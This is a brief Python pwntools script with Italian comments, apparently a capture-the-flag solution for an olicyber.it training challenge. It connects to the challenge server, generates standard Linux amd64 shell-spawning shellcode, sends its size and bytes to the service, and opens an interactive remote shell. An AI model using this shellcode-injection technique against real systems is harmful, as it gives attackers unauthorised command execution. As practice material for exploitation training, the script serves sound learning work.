#!/usr/bin/env python3
from pwn import *

# Configurazione del contesto
context.arch = 'amd64'
context.os = 'linux'

def main():
    host = 'software-20.challs.olicyber.it'
    port = 13003
    
    io = remote(host, port)

    print("[*] Superando il getchar()...")
    io.sendline(b"C")

    asm_code = shellcraft.amd64.linux.sh()
    shellcode = asm(asm_code)
    size = len(shellcode)

    print(f"[*] Invio dimensione: {size} bytes")
    io.sendlineafter(b"size (max 4096): ", str(size).encode())

    print("[*] Invio dello shellcode...")
    io.sendafter(b"bytes: ", shellcode)

    print("[+] Payload eseguito! Accesso alla shell...")
    io.interactive()

if __name__ == '__main__':
    main()